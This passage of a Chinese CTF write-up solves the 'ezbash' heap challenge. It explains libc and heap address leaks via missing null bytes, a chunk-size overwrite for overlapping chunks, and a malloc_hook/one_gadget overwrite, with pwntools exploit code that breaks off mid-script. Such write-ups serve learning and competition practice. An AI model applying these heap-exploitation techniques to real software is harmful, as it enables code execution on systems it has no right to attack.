class=\"line\">  cuurr_pos = curops;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *__fastcall <span class=\"title function_\">copy</span><span class=\"params\">(file *src, file *des)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  file *dest; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  dest = des;</span><br><span class=\"line\">  result = src;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( src != des &amp;&amp; (src-&gt;context || (result = des-&gt;context) != <span class=\"number\">0LL</span>) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( src-&gt;context || !des-&gt;context )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( src-&gt;context &amp;&amp; des-&gt;context )       <span class=\"comment\">// 文件复制到文件</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v4 = <span class=\"built_in\">strlen</span>(src-&gt;context);</span><br><span class=\"line\">        v5 = <span class=\"built_in\">strlen</span>(des-&gt;context);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v4 &gt; v5 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          dest = <span class=\"built_in\">realloc</span>(des-&gt;context, v4 + <span class=\"number\">1</span>);</span><br><span class=\"line\">          <span class=\"built_in\">memset</span>(dest-&gt;context, <span class=\"number\">0</span>, v4 + <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">memset</span>(des-&gt;context, <span class=\"number\">0</span>, v5);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        result = <span class=\"built_in\">strncpy</span>(dest-&gt;context, src-&gt;context, v4);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span>                                      <span class=\"comment\">// 没有context</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        result = src-&gt;context;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( result )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          result = des-&gt;context;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( !result )</span><br><span class=\"line\">            result = copycontext(src, des);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(des-&gt;context);</span><br><span class=\"line\">      result = des;</span><br><span class=\"line\">      des-&gt;context = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *__fastcall <span class=\"title function_\">copycontext</span><span class=\"params\">(file *src, file *dest)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = <span class=\"built_in\">strlen</span>(src-&gt;context);</span><br><span class=\"line\">  dest-&gt;context = <span class=\"built_in\">malloc</span>(v3);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(dest-&gt;context, <span class=\"number\">0</span>, v3);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">strncpy</span>(dest-&gt;context, src-&gt;context, v3);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这里 echo 是的我们的 context 大小是固定的，但是这里我们可以 malloc 指定的大小，大小根据我们拷问的文件内容的长度计算。另外一点，cp 不会向目标额外写入空字符。</p>\n<h3 id=\"泄露libc地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc地址\">#</a> 泄露 libc 地址</h3>\n<p>这是一个很无语的过程，因为 echo 的话，一定会清空数据。所以就是利用 cp，把 unsortedbins 的 chunk 申请出来，因为 copycontext 不会清空 chunk。所以我们申请一个 0x8，因为不会写入空字符，就可以把 unsortedbins 申请出来的堆块的前八字节覆盖，到那时保留了 bk 指针，同时也跟前八字节组成新的字符串。这样就泄露了 libc 的地址。为了方便，我们把要拷贝的文件的 context 的 chunksize 写大一点，后面会比较方便。入下面的 cccc 文件，context 的 chunksize=0x551</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;cccc&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&quot;BBBB&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3f2</span>,<span class=\"string\">b&quot;BBBB&quot;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;../&quot;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x3f0</span>,<span class=\"string\">b&quot;cccc&quot;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;AAAA&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">cat(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">libcbase  = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3ebca0</span> +<span class=\"number\">0x1ff0c0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libcbase : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">malloc_hook = libcbase + <span class=\"number\">0x1ecb70</span>-<span class=\"number\">0x23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"泄露堆地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露堆地址\">#</a> 泄露堆地址</h3>\n<p>有了上面的思路，泄露堆地址也很容易，glibc2.31 存在 tchche, 拷贝一字节，就可以申请一个 0x20 的 chunk，所以提前布局 2 个 0x20 的 chunk. 申请到的 tache chunk 的 fd 就不为空，我们只需要低位的几个字节就可以，我布局的两个 chunk 很近，我只要覆盖最低字节。然后就泄露了堆地址。值得一提的是，2.31 的 tcache 的 bk 指针指向 tcache，但是申请出来的时候，会自动清空 bk。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#leak the chunk addr</span></span><br><span class=\"line\">cd(<span class=\"string\">b&#x27;../&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">rmv(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">rmv(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">cd(<span class=\"string\">b&#x27;../&#x27;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;\\x70&#x27;</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;AAAA&#x27;</span>)</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">cat(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">heap_addr = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x001470</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"最后的攻击\"><a class=\"markdownIt-Anchor\" href=\"#最后的攻击\">#</a> 最后的攻击</h3>\n<p>现在 libc 的地址有了，如何实现任意地址写，因为保护全开，优先考虑了 malloc_hook + onegadget 的攻击</p>\n<p>问题来了，如何实现任意地址写？unlink 的攻击无法布局 fakechunk (因为地址只有 6 字节，我们只能写入一个地址)。</p>\n<p>基本的攻击手法必要前提在哪里，溢出，UAF,</p>\n<p>任意地址写，要么我们拿到任意地址的 fakechunk，要么修改文件的 context 的指针，然后 echo 或者 cp。</p>\n<p>我们伪造一个 fakechunk 的可能性不大，所以我们要修改 context 指针。这样的话，没有 uaf，那就考虑 overlap。</p>\n<p>关键点来了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( src-&gt;context || !des-&gt;context )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( src-&gt;context &amp;&amp; des-&gt;context )       <span class=\"comment\">// 文件复制到文件</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v4 = <span class=\"built_in\">strlen</span>(src-&gt;context);</span><br><span class=\"line\">        v5 = <span class=\"built_in\">strlen</span>(des-&gt;context);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v4 &gt; v5 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          dest = <span class=\"built_in\">realloc</span>(des-&gt;context, v4 + <span class=\"number\">1</span>);</span><br><span class=\"line\">          <span class=\"built_in\">memset</span>(dest-&gt;context, <span class=\"number\">0</span>, v4 + <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">memset</span>(des-&gt;context, <span class=\"number\">0</span>, v5);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        result = <span class=\"built_in\">strncpy</span>(dest-&gt;context, src-&gt;context, v4);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span>                                      <span class=\"comment\">// 没有context</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        result = src-&gt;context;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( result )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          result = des-&gt;context;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( !result )</span><br><span class=\"line\">            result = copycontext(src, des);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>echo 是检查 chunksize, 这里用 strlen，我们 echo 以及 cp 都不会在末尾强行补一个空字符，如果我们申请的 0x28，那么我们就可以填满 chunk 的用户空间，而且数据会与下一个堆块的 chunksize 来年再一个，只要 v4=v5, 就可以修改 chunksize，把后面的 chunk 包含进去。</p>\n<p>我们把文件部署在 actim 后面，0x51 就是我们的文件，</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">malloc(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x120</span>,<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;5&#x27;</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x1</span>,<span class=\"string\">b&#x27;6&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;mmmm&#x27;</span>)</span><br><span class=\"line\">dbg()</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x01884&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#change the chunksize wo achieve overlap</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;1&#x27;</span>,<span class=\"string\">b&#x27;\\x51\\x04&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">dbg()</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0x70</span>,<span class=\"string\">b&#x27;dir&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir2&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;dir3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;dir3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;malloc_hook : &quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p64(malloc_hook))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pad = p64(malloc_hook)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pad[<span class=\"number\">5</span>:<span class=\"number\">7</span>])</span><br><span class=\"line\">malloc(<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dir2&#x27;</span>,pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">dbg()</span><br><span class=\"line\">pad = p64(onegadget)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x23</span>)+pad[<span class=\"number\">0</span>:<span class=\"number\">6</span>],<span class=\"string\">b&#x27;5&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425154952331.png\" alt=\"image-20220425154952331\"></p>\n<p>修改后</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425155032483.png\" alt=\"image-20220425155032483\"></p>\n<p>你只能写入一个地址，context 在 chunk 的第四个 8 字节位置，我们要向改掉，申请堆块就要拿到 chunk+0x10 的 chunk</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425155752574.png\" alt=\"image-20220425155752574\"></p>\n<p>这里就是我们的 5 那个文件。我们目标是申请到她 + 0x10 的 chunk</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425160145339.png\" alt=\"image-20220425160145339\"></p>\n<p>同时我们已经将 malloc_hook-0x23 的地址写到了对应的 context 指针位置，我们下 main 只需要对他进行编辑</p>\n<p>这里为甚不直接使用 malloc_hook.cp 里面 strlen 返回的是 0，会进行 realloc，但是不是个合法的 fakechunk，realloc 会报错，echo 也要 chunk 的头部信息，所以布置在 malloc_hook-0x23，这个天然的 fakechunk, 最后 echo 进去，或者 cp 也行</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<p>赛后我们并没有对 exp 进行重新的整理，比较凌乱</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./ezbash&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#r=remote(&#x27;140.82.17.215&#x27;,20642)</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./ezbash&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">hacker = <span class=\"string\">&quot;/$ &quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">cmd</span>):</span><br><span class=\"line\">\tr.sendlineafter(hacker,cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ls</span>(<span class=\"params\">ptr</span>):</span><br><span class=\"line\">\tcmd = <span class=\"string\">b&quot;ls &quot;</span>+ptr</span><br><span class=\"line\">\tch(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cat</span>(<span class=\"params\">file</span>):</span><br><span class=\"line\">\tch(cmd = <span class=\"string\">b&quot;cat &quot;</span>+file)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cd</span>(<span class=\"params\">addr</span>):</span><br><span class=\"line\">\tch(<span class=\"string\">b&quot;cd &quot;</span>+addr)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">help</span>():</span><br><span class=\"line\">\tch(<span class=\"string\">&quot;help&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">echo</span>(<span class=\"params\">text,filename</span>):</span><br><span class=\"line\">\tcmd = <span class=\"string\">b&quot;echo &quot;</span> + text +<span class=\"string\">b&quot; -&gt; &quot;</span>+filename</span><br><span class=\"line\">\tch(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">touch</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">\tch(<span class=\"string\">b&quot;touch &quot;</span>+filename)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rmv</span>(<span class=\"params\">flag,filename</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> flag==<span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tcmd = <span class=\"string\">b&quot;rm -r &quot;</span>+filename</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> :</span><br><span class=\"line\">\t\tcmd = <span class=\"string\">b&quot;rm &quot;</span>+filename</span><br><span class=\"line\">\tch(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mkdir</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">\tch(<span class=\"string\">b&quot;mkdir &quot;</span>+filename)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwd</span>():</span><br><span class=\"line\">\tch(<span class=\"string\">&quot;pwd&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cp</span>(<span class=\"params\">a,b</span>):</span><br><span class=\"line\">\tcmd = <span class=\"string\">b&quot;cp &quot;</span>+a+<span class=\"string\">b&quot; &quot;</span>+b</span><br><span class=\"line\">\tch(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">malloc</span>(<span class=\"params\">size,ptr,tail=<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span>):</span><br><span class=\"line\">\tpad = <span class=\"string\">b&#x27;a&#x27;</span>*size + tail</span><br><span class=\"line\">\techo(pad,<span class=\"string\">b&#x27;cccc&#x27;</span>)</span><br><span class=\"line\">\tcp(<span class=\"string\">b&#x27;cccc&#x27;</span>,ptr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">malloc1</span>(<span class=\"params\">size,ptr,tail=<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span>):</span><br><span class=\"line\">\tpad = <span class=\"string\">b&#x27;a&#x27;</span>*size + tail</span><br><span class=\"line\">\techo(pad,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">\tcp(<span class=\"string\">b&#x27;a&#x27;</span>,ptr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">ptr</span>):</span><br><span class=\"line\">\tcp(<span class=\"string\">b&#x27;free&#x27;</span>,ptr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dbg</span>():</span><br><span class=\"line\">\tgdb.attach(r)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">mkdir(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;cccc&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&quot;BBBB&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3f2</span>,<span class=\"string\">b&quot;BBBB&quot;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;../&quot;</span>)</span><br><span class=\"line\">echo(<span 